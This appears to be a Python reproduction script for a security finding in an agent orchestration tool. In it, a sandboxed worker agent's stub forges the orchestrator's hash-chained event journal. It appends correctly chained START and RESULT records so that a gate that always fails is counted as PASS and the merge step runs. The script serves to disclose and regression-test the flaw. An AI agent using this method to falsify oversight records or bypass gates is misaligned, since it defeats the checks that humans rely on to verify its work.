#!/usr/bin/env python3
"""P2: a sandboxed worker forges the kernel's journal and makes a failing gate count as PASS.

Usage: python3 -I p2_worker_forges_journal.py <path-to-pinned-v4>
Runs in a fresh mktemp directory; the worker is a stub inside the REAL adapters/sandbox.sh (bwrap, --rw ., --net 0).

Layout is the documented default: state directory inside the repo (cli.py default --state .autoshift-state with
--repo .; docs/OPERATIONS.md uses --repo "$PWD" --state "$PWD/.autoshift-state"). The shipped graphs bind the repo
read-write into the sandbox (--rw .), so the journal is writable by the worker. The hash chain has no secret key,
so the worker can append correctly chained events. The gate command always fails; it never runs.
"""
import json, sys, tempfile
from pathlib import Path

V4 = Path(sys.argv[1]).resolve()
sys.path.insert(0, str(V4))
from autoshift.graph import validate
import os
from autoshift.scheduler import Engine
# ---- v7 SETUP (not part of the original attack): static quota readings need this switch since v5;
# V7 tells whether this tree has locked gates (v7) or not (v4), so one copy can run on both.
os.environ['AUTOSHIFT_TEST_STATIC_QUOTA'] = '1'
V7 = 'trusted_gate' in (V4 / 'autoshift/runner.py').read_text()

work = Path(tempfile.mkdtemp(prefix='p2-'))
repo = work / 'repo'; repo.mkdir()
print('scratch', work)
forger = repo / 'forger.py'
forger.write_text(r'''
import fcntl, hashlib, json, sys
from pathlib import Path
state = Path('.autoshift-state')          # visible: inside the --rw bind
def canonical(o): return json.dumps(o, sort_keys=True, ensure_ascii=True, separators=(',', ':')).encode()
with open(state / 'journal.guard', 'a') as g:
    fcntl.flock(g, fcntl.LOCK_EX)         # even the kernel's own lock is available to the worker
    lines = [json.loads(l) for l in (state / 'events.jsonl').read_bytes().splitlines() if l]
    prev = lines[-1]['hash']; seq = len(lines)
    out = b''
    for kind, key, data in (('START', 'start:gate:1', {'attempt': 1, 'tier': None}),
                            ('RESULT', 'result:gate:1', {'status': 'PASS', 'rc': 0, 'artifacts': [], 'missing': [],
                                                         'claims': [], 'signature': '0:', 'node': 'gate', 'attempt': 1})):
        seq += 1
        e = {'seq': seq, 'previous': prev, 'type': kind, 'key': key, 'node': 'gate', 'data': data}
        e['hash'] = hashlib.sha256(canonical(e)).hexdigest(); prev = e['hash']
        out += canonical(e) + b'\n'
    with open(state / 'events.jsonl', 'ab') as f: f.write(out)
import time; time.sleep(0.5)
print(json.dumps({'claims': []}))
''')
# ---- v7 SETUP: declared writable bind instead of --rw ., and a locked gate that always fails ----
(repo / 'src').mkdir()
locked = work / 'owner-gates'; locked.mkdir()
(locked / 'gate.sh').write_text('#!/bin/bash\necho "gate always fails" >&2\nexit 1\n')
GATE_OK = '.autoshift-gate-output/gate.ok' if V7 else 'gate.ok'
g = validate({'name': 'forgery', 'wip': 1, 'quota': {'claude': {'usage_pct': 0, 'limit_pct': 80}},
              'nodes': [
                  {'id': 'worker', 'kind': 'agent', 'role': 'worker', 'goal': 'implement feature', 'tiers': [{'provider': 'claude', 'model': 'haiku'}],
                   'sandbox': [str(V4 / 'adapters/sandbox.sh'), '--rw', 'src', '--ro', 'forger.py', '--net', '0'], 'max_attempts': 1},
                  {'id': 'gate', 'kind': 'gate', 'cmd': ['python3', '-c', 'raise SystemExit("gate always fails")'], 'artifacts': [GATE_OK],
                   'trusted_gate': {'root': str(locked), 'entry': 'gate.sh'}},
                  {'id': 'merge', 'kind': 'code', 'cmd': ['python3', '-c', "open('merged.txt','w').write('merged')"], 'artifacts': ['merged.txt']}],
              'edges': [{'from': 'worker', 'to': 'gate'}, {'from': 'gate', 'to': 'merge'}]})
eng = Engine(g, repo, work / 'state', {'claude': ['python3', str(forger)]})
r = eng.run()
print('statuses', {k: v['status'] for k, v in eng.j.state['nodes'].items()})
print('journal:', [(e['seq'], e['type'], e['node']) for e in eng.j.events if e['type'] in ('START', 'RESULT')])
print('replay diff:', eng.j.diff(), '; merged.txt exists:', (repo / 'merged.txt').exists())
print('gate command ever ran? raw stdout file present:', (work / 'state/raw/gate-1.stdout').exists())
assert eng.j.state['nodes']['gate']['status'] == 'PASS' and (repo / 'merged.txt').exists() and eng.j.diff() == []
print('P2 REPRODUCED')
